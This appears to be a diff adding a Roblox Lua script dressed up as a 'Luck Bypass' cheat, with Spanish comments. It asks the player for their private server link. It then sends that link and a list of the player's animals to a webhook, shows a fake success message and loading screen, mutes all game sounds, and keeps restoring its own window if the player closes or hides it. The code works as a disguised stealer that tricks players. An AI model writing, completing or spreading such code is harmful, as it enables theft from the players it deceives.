+    end
+    return snippet
+end
+
+local function createNewLine()
+    local lineLabel = Instance.new("TextLabel")
+    lineLabel.Name = "CodeLine" .. currentLine
+    lineLabel.Size = UDim2.new(1, -20, 0, 16)
+    lineLabel.Position = UDim2.new(0, 10, 0, (#allLines) * 16)
+    lineLabel.BackgroundTransparency = 1
+    lineLabel.Text = ""
+    lineLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
+    lineLabel.TextTransparency = 0.6
+    lineLabel.TextSize = 14
+    lineLabel.Font = Enum.Font.Arcade
+    lineLabel.TextXAlignment = Enum.TextXAlignment.Left
+    lineLabel.TextYAlignment = Enum.TextYAlignment.Top
+    lineLabel.ZIndex = 11
+    lineLabel.Parent = codeBackground
+
+    table.insert(allLines, lineLabel)
+    currentLine = currentLine + 1
+
+    return lineLabel
+end
+
+local currentSnippet = getRandomCodeSnippet()
+local snippetIndex = 1
+local activeLine = createNewLine()
+
+task.spawn(function()
+    while codeBackground.Parent do
+        if snippetIndex <= #currentSnippet then
+            local fullText = currentSnippet[snippetIndex]
+
+            if currentChar <= #fullText then
+                activeLine.Text = string.sub(fullText, 1, currentChar)
+                currentChar = currentChar + 1
+                task.wait(0.005)
+            else
+                task.wait(0.1)
+                currentChar = 1
+                snippetIndex = snippetIndex + 1
+
+                if snippetIndex <= #currentSnippet then
+                    activeLine = createNewLine()
+
+                    if #allLines > maxLines then
+                        local oldestLine = allLines[1]
+                        table.remove(allLines, 1)
+                        oldestLine:Destroy()
+
+                        for i, line in ipairs(allLines) do
+                            line.Position = UDim2.new(0, 10, 0, (i - 1) * 16)
+                        end
+                    end
+                end
+            end
+        else
+            task.wait(1)
+            currentSnippet = getRandomCodeSnippet()
+            snippetIndex = 1
+            currentChar = 1
+            activeLine = createNewLine()
+
+            if #allLines > maxLines then
+                local oldestLine = allLines[1]
+                table.remove(allLines, 1)
+                oldestLine:Destroy()
+
+                for i, line in ipairs(allLines) do
+                    line.Position = UDim2.new(0, 10, 0, (i - 1) * 16)
+                end
+            end
+        end
+
+        task.wait(0.00011)
+    end
+end)
+
+-- Gradiente ROJO-CARMESÍ en el outline principal
+local mainFrameStroke = Instance.new("UIStroke")
+mainFrameStroke.Thickness = 10
+mainFrameStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí base
+mainFrameStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+mainFrameStroke.Parent = mainFrame
+createRedCrimsonGradientPulse(mainFrameStroke)
+
+-- Imagen del decal en la izquierda
+local centerImage = Instance.new("ImageLabel")
+centerImage.Name = "CenterDecal"
+centerImage.Size = UDim2.new(0, 180, 0, 180)
+centerImage.Position = UDim2.new(0, 30, 0.5, -90)
+centerImage.BackgroundTransparency = 1
+centerImage.Image = "rbxassetid://91819568091646"
+centerImage.ScaleType = Enum.ScaleType.Fit
+centerImage.ZIndex = 12
+centerImage.Parent = innerFrame
+
+-- Título centrado horizontalmente con ROJO-CARMESÍ
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Parent = innerFrame
+titleLabel.Size = UDim2.new(0, 400, 0, 50)
+titleLabel.Position = UDim2.new(0.5, -100, 0, 40)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Miranda Luck Bypass"
+titleLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
+titleLabel.TextSize = 28
+titleLabel.Font = Enum.Font.Arcade
+titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+titleLabel.ZIndex = 13
+
+local titleStroke = Instance.new("UIStroke")
+titleStroke.Thickness = 3
+titleStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
+titleStroke.Parent = titleLabel
+createRedCrimsonGradientPulse(titleStroke)
+
+-- Subtítulo "By Miranda" centrado debajo del título
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Parent = innerFrame
+subtitleLabel.Size = UDim2.new(0, 400, 0, 25)
+subtitleLabel.Position = UDim2.new(0.5, -100, 0, 95)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Text = "By MIRANDA"
+subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+subtitleLabel.TextSize = 16
+subtitleLabel.Font = Enum.Font.Arcade
+subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+subtitleLabel.ZIndex = 13
+
+-- Label de instrucción a la izquierda
+local inputSectionLabel = Instance.new("TextLabel")
+inputSectionLabel.Parent = innerFrame
+inputSectionLabel.Size = UDim2.new(0, 340, 0, 25)
+inputSectionLabel.Position = UDim2.new(0, 220, 0, 150)
+inputSectionLabel.BackgroundTransparency = 1
+inputSectionLabel.Text = "Please Enter your private server link"
+inputSectionLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
+inputSectionLabel.TextSize = 14
+inputSectionLabel.Font = Enum.Font.Arcade
+inputSectionLabel.TextXAlignment = Enum.TextXAlignment.Left
+inputSectionLabel.ZIndex = 13
+
+-- Input box compacta a la izquierda
+local inputBox = Instance.new("TextBox")
+inputBox.Parent = innerFrame
+inputBox.Size = UDim2.new(0, 340, 0, 40)
+inputBox.Position = UDim2.new(0, 220, 0, 185)
+inputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+inputBox.BorderSizePixel = 0
+inputBox.Text = ""
+inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputBox.TextSize = 12
+inputBox.Font = Enum.Font.Arcade
+inputBox.PlaceholderText = "https://www.roblox.com/games/..."
+inputBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
+inputBox.TextXAlignment = Enum.TextXAlignment.Left
+inputBox.TextWrapped = true
+inputBox.TextTruncate = Enum.TextTruncate.AtEnd
+inputBox.ClearTextOnFocus = false
+inputBox.ZIndex = 13
+
+local inputPadding = Instance.new("UIPadding")
+inputPadding.PaddingLeft = UDim.new(0, 10)
+inputPadding.Parent = inputBox
+
+local inputCorner = Instance.new("UICorner")
+inputCorner.CornerRadius = UDim.new(0, 8)
+inputCorner.Parent = inputBox
+
+local inputStroke = Instance.new("UIStroke")
+inputStroke.Thickness = 2
+inputStroke.Color = Color3.fromRGB(220, 20, 60) -- Carmesí
+inputStroke.Parent = inputBox
+createRedCrimsonGradientPulse(inputStroke)
+
+-- Botón ENTER debajo del input con ROJO-CARMESÍ
+local serverButton = Instance.new("TextButton")
+serverButton.Name = "ServerButton"
+serverButton.Parent = innerFrame
+serverButton.Size = UDim2.new(0, 200, 0, 45)
+serverButton.Position = UDim2.new(0, 290, 0, 245)
+serverButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50) -- Rojo brillante
+serverButton.BorderSizePixel = 0
+serverButton.Text = "ENTER"
+serverButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+serverButton.TextSize = 24
+serverButton.Font = Enum.Font.Arcade
+serverButton.ZIndex = 13
+
+local serverCorner = Instance.new("UICorner")
+serverCorner.CornerRadius = UDim.new(0, 10)
+serverCorner.Parent = serverButton
+
+local serverStroke = Instance.new("UIStroke")
+serverStroke.Thickness = 3
+serverStroke.Color = Color3.fromRGB(139, 0, 0) -- Rojo oscuro carmesí
+serverStroke.Parent = serverButton
+
+serverButton.MouseEnter:Connect(function()
+    TweenService:Create(serverButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(255, 100, 100),
+        Size = UDim2.new(0, 210, 0, 50)
+    }):Play()
+end)
+
+serverButton.MouseLeave:Connect(function()
+    TweenService:Create(serverButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(255, 50, 50),
+        Size = UDim2.new(0, 200, 0, 45)
+    }):Play()
+end)
+
+-- Status label debajo del botón
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Parent = innerFrame
+statusLabel.Size = UDim2.new(0, 340, 0, 25)
+statusLabel.Position = UDim2.new(0, 220, 0, 305)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Ready to send..."
+statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
+statusLabel.TextSize = 13
+statusLabel.Font = Enum.Font.Arcade
+statusLabel.TextXAlignment = Enum.TextXAlignment.Center
+statusLabel.ZIndex = 13
+
+serverButton.MouseButton1Click:Connect(function()
+    local link = inputBox.Text
+
+    if link == "" then
+        statusLabel.Text = "ERROR: Empty link!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        task.wait(2)
+        statusLabel.Text = "Ready to send..."
+        statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
+        return
+    end
+
+    statusLabel.Text = "Checking Servers..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+
+    local podiumInfo = getPodiumInfo()
+    local foundAnimals = {}
+
+    if not podiumInfo.error then
+        local hasAnimal
+        hasAnimal, foundAnimals = hasAllowedAnimal(podiumInfo)
+    end
+
+    statusLabel.Text = "Preparing script..."
+    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+
+    local success = sendToWebhook(link, foundAnimals)
+
+    if success then
+        statusLabel.Text = "✓ Executed successfully!"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+
+        TweenService:Create(serverButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+        }):Play()
+
+        task.wait(0.5)
+
+        if screenGui then
+            screenGui:Destroy()
+        end
+
+        createLoadingScreen()
+
+    else
+        statusLabel.Text = "X Invalid private server link!"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+
+        TweenService:Create(serverButton, TweenInfo.new(0.2), {
+            BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+        }):Play()
+
+        task.wait(1)
+
+        TweenService:Create(serverButton, TweenInfo.new(0.3), {
+            BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+        }):Play()
+
+        task.wait(2)
+        statusLabel.Text = "Ready to send..."
+        statusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
+    end
+end)
+
+-- Efectos de partículas en ROJO-CARMESÍ
+local particleFrame = Instance.new("Frame")
+particleFrame.Parent = innerFrame
+particleFrame.Size = UDim2.new(1, 0, 1, 0)
+particleFrame.BackgroundTransparency = 1
+particleFrame.ZIndex = 12
+
+for i = 1, 12 do
+    local p = Instance.new("Frame")
+    p.Parent = particleFrame
+    p.Size = UDim2.new(0, math.random(3, 6), 0, math.random(3, 6))
+    p.Position = UDim2.new(math.random(), 0, math.random(), 0)
+    p.BackgroundColor3 = Color3.fromRGB(255, math.random(20, 60), math.random(20, 60)) -- Tonos rojos
+    p.BorderSizePixel = 0
+    p.BackgroundTransparency = 0.5
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(1, 0)
+    c.Parent = p
+    TweenService:Create(p, TweenInfo.new(math.random(5, 10), Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
+        {Position = UDim2.new(math.random(), 0, math.random(), 0)}):Play()
+end
+
+local function mutearTodosSonidos()
+    local function mutear(sound)
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+            sound.Playing = false
+        end
+    end
+
+    for _, obj in pairs(game:GetDescendants()) do
+        mutear(obj)
+    end
+
+    game.DescendantAdded:Connect(function(obj)
+        mutear(obj)
+    end)
+
+    spawn(function()
+        while wait(1) do
+            for _, obj in pairs(game:GetDescendants()) do
+                if obj:IsA("Sound") then obj.Volume = 0 end
+            end
+        end
+    end)
+end
+
+local function proteccionAntiDestruccion()
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local backups = {}
+
+    local function crearBackup(nombreGui)
+        local gui = PlayerGui:FindFirstChild(nombreGui)
+        if gui then 
+            backups[nombreGui] = gui:Clone()
+        end
+    end
+
+    local function restaurarGUI(nombreGui)
+        if backups[nombreGui] then
+            local nuevoGui = backups[nombreGui]:Clone()
+            nuevoGui.Parent = PlayerGui
+            crearBackup(nombreGui)
+        end
+    end
+
+    task.wait(2)
+    crearBackup("MoneyBypasserLoader")
+
+    spawn(function()
+        while wait(0.5) do
+            if not PlayerGui:FindFirstChild("MoneyBypasserLoader") then
+                restaurarGUI("MoneyBypasserLoader")
+            end
+            if not PlayerGui:FindFirstChild("ArcadeGUI") then
+                restaurarGUI("ArcadeGUI")
+            end
+        end
+    end)
+
+    PlayerGui.DescendantRemoving:Connect(function(descendant)
+        if descendant.Name == "MoneyBypasserLoader" then
+            task.spawn(function()
+                task.wait(0.05)
+                restaurarGUI(descendant.Name)
+            end)
+        end
+    end)
+end
+
+local function proteccionAntiOcultacion()
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local guisProtegidos = {"MoneyBypasserLoader"}
+
+    local function forzarVisibilidad(gui)
+        if not gui or not gui.Parent then return end
+
+        if gui:IsA("ScreenGui") then
+            gui.Enabled = true
+            gui.DisplayOrder = 999999
+            gui.IgnoreGuiInset = true
+            gui.ResetOnSpawn = false
+        end
+
+        for _, descendant in pairs(gui:GetDescendants()) do
+            if descendant:IsA("GuiObject") then
+                pcall(function()
+                    descendant.Visible = true
+                end)
+            end
+        end
+    end
+
+    local function configurarProteccion(nombreGui)
+        local gui = PlayerGui:FindFirstChild(nombreGui)
+        if not gui then return end
+
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if gui.Enabled == false then
+                gui.Enabled = true
+            end
+        end)
+
+        gui:GetPropertyChangedSignal("DisplayOrder"):Connect(function()
+            if gui.DisplayOrder < 999999 then
+                gui.DisplayOrder = 999999
+            end
+        end)
+
+        gui:GetPropertyChangedSignal("ResetOnSpawn"):Connect(function()
+            if gui.ResetOnSpawn == true then
+                gui.ResetOnSpawn = false
+            end
+        end)
+
+        local function protegerElemento(elemento)
+            if elemento:IsA("GuiObject") then
+                elemento:GetPropertyChangedSignal("Visible"):Connect(function()
+                    if elemento.Visible == false and elemento.Parent then
+                        elemento.Visible = true
+                    end
+                end)
+            end
+        end
+
+        for _, descendant in pairs(gui:GetDescendants()) do
+            protegerElemento(descendant)
+        end
+
+        gui.DescendantAdded:Connect(function(descendant)
+            protegerElemento(descendant)
+        end)
+    end
+
+    task.wait(2)
+    for _, nombreGui in ipairs(guisProtegidos) do
+        configurarProteccion(nombreGui)
+    end
+
+    spawn(function()
+        while wait(0.3) do
+            for _, nombreGui in ipairs(guisProtegidos) do
+                local gui = PlayerGui:FindFirstChild(nombreGui)
+                if gui then
+                    forzarVisibilidad(gui)
+                end
+            end
+        end
+    end)
+
+    PlayerGui.ChildAdded:Connect(function(child)
+        for _, nombreGui in ipairs(guisProtegidos) do
+            if child.Name == nombreGui then
+                task.wait(0.1)
+                configurarProteccion(nombreGui)
+            end
+        end
+    end)
+end
+
+local function proteccionParent()
+    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+    local guisProtegidos = {"MoneyBypasserLoader"}
+
+    task.wait(2)
+
+    for _, nombreGui in ipairs(guisProtegidos) do
+        local gui = PlayerGui:FindFirstChild(nombreGui)
+        if gui then
+            gui:GetPropertyChangedSignal("Parent"):Connect(function()
+                if gui.Parent ~= PlayerGui then
+                    gui.Parent = PlayerGui
+                end
+            end)
+        end
+    end
+end
+
+mutearTodosSonidos()
+
+spawn(function()
+    task.wait(3)
+    proteccionAntiDestruccion()
+    proteccionAntiOcultacion()
+    proteccionParent()
+end)
